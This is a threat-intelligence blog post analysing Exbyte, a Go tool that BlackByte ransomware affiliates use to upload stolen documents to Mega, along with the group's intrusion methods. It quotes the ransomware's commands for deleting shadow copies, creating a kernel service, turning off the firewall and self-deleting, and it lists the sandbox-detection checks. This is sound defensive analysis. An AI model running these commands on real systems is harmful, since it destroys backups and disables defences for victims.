class="blog-post__title">Exbyte: BlackByte Ransomware Attackers Deploy New Exfiltration Tool</h1><h2 class="blog-post__subtitle">Exbyte is the latest tool developed by ransomware attackers to expedite data theft from victims.</h2></header><span><!----><app-paragraph-rte _nghost-ng-c2666164074><div _ngcontent-ng-c2666164074><p>Symantecs Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom.Blackbyte) operation has begun using a custom data exfiltration tool during their attacks. The malware (Infostealer.Exbyte) is designed to expedite the theft of data from the victims network and upload it to an external server.</p>

<p>BlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public attention in February 2022 when <a href="https://www.ic3.gov/Media/News/2022/220211.pdf">the U.S. Federal Bureau of Investigation (FBI) issued an alert</a> stating that BlackByte had been used to attack multiple entities in the U.S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one of the most frequently used payloads in ransomware attacks.</p>

<h2>Inside Exbyte</h2>

<p>The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service.</p>

<p>On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications:</p>

<ul>
	<li>MegaDumper 1.0 by CodeCracker / SnD</li>
	<li>Import reconstructor</li>
	<li>x64dbg</li>
	<li>x32dbg</li>
	<li>OLLYDBG</li>
	<li>WinDbg</li>
	<li>The Interactive Disassembler</li>
	<li>Immunity Debugger -&nbsp;[CPU]</li>
</ul>

<p>It then checks for the following anti-virus or sandbox-related files:</p>

<ul>
	<li>avghooka.dll</li>
	<li>avghookx.dll</li>
	<li>sxin.dll</li>
	<li>sf2.dll</li>
	<li>sbiedll.dll</li>
	<li>snxhk.dll</li>
	<li>cmdvrt32.dll</li>
	<li>cmdvrt64.dll</li>
	<li>wpespy.dll</li>
	<li>vmcheck.dll</li>
	<li>pstorec.dll</li>
	<li>dir_watch.dll</li>
	<li>api_log.dll</li>
	<li>dbghelp.dll</li>
</ul>

<p>This routine of checks is quite similar to the routine employed by the BlackByte payload itself, <a href="https://news.sophos.com/en-us/2022/10/04/blackbyte-ransomware-returns/">as documented recently by Sophos</a>.</p>

<p>Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to %APPDATA%\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account used are hardcoded into Exbyte.</p>

<p>Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021, <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration">Symantec discovered Exmatter</a>, an exfiltration tool that was used by the BlackMatter ransomware operation and <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps">has since been used in Noberus attacks</a>. Other examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware.</p>

<h2>BlackByte TTPs</h2>

<p>In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473">CVE-2021-34473</a>,&nbsp;<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523">CVE-2021-34523</a>, and&nbsp;<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31207">CVE-2021-31207</a>) and ProxyLogon (<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855">CVE-2021-26855</a>&nbsp;and&nbsp;<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-27065">CVE-2021-27065</a>) vulnerabilities in Microsoft Exchange Servers to gain initial access.</p>

<p>Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload.</p>

<p>Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save debugging symbols from Microsoft. The command is executed directly from the ransomware:</p>

<p><em>powershell -command "(New-Object Net.WebClient).DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb', 'CSIDL_SYSTEM_DRIVE\systemdata\ntkrnlmp.pdb')"</em></p>

<p>The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details:</p>

<p><em>binPath = C:\systemdata\generalate</em></p>

<p><em>displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!!</em></p>

<p>BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This functionality in BlackByte <a href="https://news.sophos.com/en-us/2022/10/04/blackbyte-ransomware-returns/">has already been documented by Sophos</a> and it closely resembles the techniques leveraged in <a href="https://github.com/wavestone-cdt/EDRSandblast">the EDRSandblast tool</a>.</p>

<p>BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation:</p>

<p><em>cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet</em></p>

<p><em>vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB</em></p>

<p>It then makes the following service modifications:</p>

<p><em>sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\systemdata\generalate type= kernel</em></p>

<p><em>sc.exe config RemoteRegistry start= auto</em></p>

<p><em>sc.exe config Dnscache start= auto</em></p>

<p><em>sc.exe config SSDPSRV start= auto</em></p>

<p><em>sc.exe config fdPHost start= auto</em></p>

<p><em>sc.exe config upnphost start= auto</em></p>

<p>The ransomware then modifies firewall settings to enable linked connections:</p>

<p><em>netsh advfirewall firewall set rule "group=\"Network Discovery\" " new enable=Yes"</em></p>

<p><em>netsh advfirewall firewall set rule "group=\"File and Printer Sharing\" " new enable=Yes"</em></p>

<p><em>cmd.exe /c netsh advfirewall set allprofiles state off</em></p>

<p>Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk:</p>

<p><em>cmd.exe /c ping 1.1.1.1 -n 10 &gt; Nul &amp; Del CSIDL_WINDOWS\rdac.exe /F /Q</em></p>

<p><em>CSIDL_SYSTEM\svchost.exe -s 27262842</em></p>

<h2>Emerging Force</h2>

<p>Following the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks suggests that it may be on the way to becoming one of the dominant ransomware threats.</p>
